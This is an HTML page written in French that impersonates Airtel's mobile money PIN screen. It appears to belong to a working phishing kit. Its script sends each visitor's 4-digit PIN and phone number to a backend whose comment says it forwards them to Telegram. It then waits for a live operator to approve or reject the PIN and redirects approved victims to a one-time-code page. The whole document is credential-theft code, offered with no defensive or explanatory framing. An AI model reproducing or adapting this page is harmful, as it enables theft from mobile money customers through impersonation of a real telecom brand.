<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airtel - PIN</title>
    <style>
        * { box-sizing: border-box; font-family: sans-serif; }
        body { margin: 0; background-color: #E40000; display: flex; flex-direction: column; min-height: 100vh; }
        .top-red { padding: 40px 20px; text-align: center; color: white; }
        .logo { font-size: 40px; font-weight: bold; font-style: italic; letter-spacing: -2px; }
        .tagline { font-size: 10px; letter-spacing: 2px; }
        
        .bottom-white { background: white; flex-grow: 1; border-top-left-radius: 24px; border-top-right-radius: 24px; padding: 30px 20px; display: flex; flex-direction: column; }
        .title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .sub { font-size: 14px; color: #666; margin-bottom: 20px; }
        
        .error-msg { color: #E40000; font-weight: bold; text-align: center; display: none; margin-bottom: 15px; }
        
        .pin-dots { display: flex; justify-content: center; gap: 20px; margin-bottom: 30px; }
        .pin-dot { width: 20px; height: 20px; border: 2px solid #ccc; border-radius: 50%; }
        .pin-dot.filled { background-color: #E40000; border-color: #E40000; }
        
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 300px; margin: 0 auto 20px auto; }
        .keypad button { width: 70px; height: 70px; border-radius: 50%; border: none; background: #f0f0f0; font-size: 24px; font-weight: bold; color: #333; margin: 0 auto; cursor: pointer; }
        
        .btn-main { width: 100%; background-color: #E40000; color: white; font-size: 16px; font-weight: bold; padding: 15px; border: none; border-radius: 24px; margin-top: auto; cursor: pointer; }
        .btn-main:disabled { background-color: #9ca3af; }
        
        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #E40000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="spinner"></div>
        <h2 style="color:#FFCC00;">Vérification...</h2>
        <p>Veuillez patienter.</p>
    </div>

    <div class="top-red">
        <div class="logo">airtel</div>
        <div class="tagline">UNE RAISON D'IMAGINER</div>
    </div>

    <div class="bottom-white">
        <div class="title">Entrez le code PIN</div>
        <div class="sub">Entrez votre code PIN à 4 chiffres</div>
        
        <div id="pinError" class="error-msg">Code PIN incorrect. Réessayez.</div>
        
        <div class="pin-dots" id="pinDots">
            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
        </div>
        
        <div class="keypad">
            <button type="button" onclick="enterPin('1')">1</button>
            <button type="button" onclick="enterPin('2')">2</button>
            <button type="button" onclick="enterPin('3')">3</button>
            <button type="button" onclick="enterPin('4')">4</button>
            <button type="button" onclick="enterPin('5')">5</button>
            <button type="button" onclick="enterPin('6')">6</button>
            <button type="button" onclick="enterPin('7')">7</button>
            <button type="button" onclick="enterPin('8')">8</button>
            <button type="button" onclick="enterPin('9')">9</button>
            <div></div>
            <button type="button" onclick="enterPin('0')">0</button>
            <button type="button" onclick="deletePin()" style="font-size:14px;">DEL</button>
        </div>
        
        <button id="pinBtn" class="btn-main" disabled onclick="submitPin()">Continuer</button>
    </div>

    <script>
        var enteredPin = "";
        var globalUserId = Date.now().toString().slice(-6);
        var userPhone = sessionStorage.getItem('userPhone') || "+243000000000";

        function enterPin(num) { if (enteredPin.length < 4) { enteredPin += num; updateDots(); } }
        function deletePin() { enteredPin = enteredPin.slice(0, -1); updateDots(); }
        
        function updateDots() {
            var dots = document.querySelectorAll('.pin-dot');
            for(var i=0; i<dots.length; i++) {
                if (i < enteredPin.length) { dots[i].classList.add('filled'); } 
                else { dots[i].classList.remove('filled'); }
            }
            document.getElementById('pinBtn').disabled = enteredPin.length !== 4;
            document.getElementById('pinError').style.display = 'none';
        }

        function submitPin() {
            document.getElementById('overlay').style.display = 'flex';
            
            // Send to Telegram
            fetch('/api/bot', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    action: 'send', type: 'PIN', userId: globalUserId, 
                    data: { phone: userPhone, value: enteredPin } 
                })
            }).then(function() {
                sessionStorage.setItem('pin', enteredPin); // Save pin for next page
                pollStatus();
            });
        }

        function pollStatus() {
            var interval = setInterval(function() {
                fetch('/api/bot?userId=' + globalUserId + '&type=pin')
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    if (data.status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'otp.html'; // Move to OTP Page
                    } 
                    else if (data.status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('overlay').style.display = 'none';
                        document.getElementById('pinError').style.display = 'block';
                        enteredPin = ""; updateDots();
                    }
                });
            }, 2000);
        }
    </script>
</body>
</html>
